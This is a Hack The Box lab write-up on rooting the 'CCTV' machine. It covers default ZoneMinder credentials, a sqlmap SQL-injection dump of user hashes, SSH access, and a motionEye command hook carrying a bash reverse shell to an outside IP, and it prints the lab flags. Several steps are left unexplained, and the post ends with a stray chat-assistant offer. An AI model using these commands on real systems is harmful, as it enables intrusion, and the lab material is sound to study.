---
title: Hack The Box - CCTV Walkthrough
toc: true
date: 2026-03-13 22:30:00 +0800
categories: [HackTheBox, HTB-Writeup]
tags: [ctf, pentesting, sql-injection, privilege-escalation, linux]
description: Full penetration testing walkthrough of the CCTV machine on Hack The Box from initial access to root.
image:
  path: /commons/devices-mockup.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
---



This post documents the full attack chain used to compromise the **CCTV** machine on Hack The Box. The machine demonstrates how multiple small vulnerabilities can combine into a full system compromise.

---

## Reconnaissance

The first step was identifying open ports using **Nmap**.

```bash
nmap -sC -sV -oN nmap_scan 10.129.x.x
````

Result:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH
80/tcp   open  http    Apache
```

A web application was running on port **80**.

---

## Web Enumeration

Opening the web interface revealed a CCTV monitoring dashboard powered by **ZoneMinder**.

```
http://cctv.htb/zm
```

Testing common credentials revealed that the application still used **default credentials**.

```
Username: admin
Password: admin
```

After logging in, access to the dashboard was obtained.

---

## SQL Injection Discovery

While exploring the application, a vulnerable endpoint was discovered.

```
/zm/index.php?view=request&request=event&action=removetag&tid=1
```

This endpoint was vulnerable to **time-based SQL injection**.

---

## Database Extraction

The vulnerability was exploited using **sqlmap**.

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
-D zm -T Users -C Username,Password \
--dump \
--batch \
--dbms=MySQL \
--technique=T
```

The **Users** table was dumped successfully.

Example result:

```
Username | Password
-------------------------
mark     | 989c5a8ee87a0e9521ec81a79187d162109282f0
```

---

## SSH Access

Using the discovered credentials, SSH login was attempted.

```bash
ssh mark@cctv.htb
```

The login succeeded, giving a **user shell** on the machine.

---

## Local Enumeration

During enumeration, a local service was discovered.

```
127.0.0.1:8765
```

This service was **motionEye**, a web interface used to manage motion-based CCTV cameras.

---

## Sensitive Configuration Discovery

The configuration file for motionEye contained sensitive information.

```
/etc/motioneye/motion.conf
```

Inside the file:

```
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

This value is used by motionEye to **sign privileged API requests**.

---

## Abusing motionEye API

motionEye allows camera configuration changes via signed API requests.

By using the exposed secret, a valid request was generated to modify the camera configuration.

A command execution hook was injected using:

```
command_storage_exec
```

Payload used:

```bash
bash -i >& /dev/tcp/10.10.15.182/4444 0>&1
```

---

## Triggering Code Execution

To execute the command, a camera snapshot event was triggered.

```bash
curl -X POST http://127.0.0.1:8765/action/1/snapshot
```

A listener was started on the attacker machine.

```bash
nc -lvnp 4444
```

The reverse shell connected successfully.

---

## Privilege Escalation

The motionEye service was running as **root**, so the injected command executed with root privileges.

```
root@cctv:/#
```

Full system compromise was achieved.

---

## Flags

### User Flag

```
/home/sa_mark/user.txt
```

```
b1a4a8d9fbea33c20745dbdbecd68457
```

---

### Root Flag

```
/root/root.txt
```

```
c030d189cafc837f2c64bdb082942c40
```

---

## Attack Chain Summary

```
Default credentials (admin:admin)
        ↓
SQL injection in ZoneMinder
        ↓
Dump database users table
        ↓
Obtain mark credentials
        ↓
SSH access as mark
        ↓
Discover local motionEye service
        ↓
Extract admin secret from configuration
        ↓
Generate signed API request
        ↓
Inject command execution hook
        ↓
Trigger snapshot event
        ↓
Root shell
```

---

## Key Takeaways

This machine demonstrates several common security issues:

* Default credentials left unchanged
* SQL injection vulnerabilities
* Sensitive secrets stored in configuration files
* Unsafe command execution hooks
* Services running with unnecessary root privileges

When these weaknesses combine, they can easily lead to a full system compromise.

```

---

If you want, I can also help you **improve this for your GitHub Pages blog** by adding:

- preview image for Chirpy
- Mermaid attack chain diagram
- nicer section formatting
- SEO tags for cybersecurity posts.
```
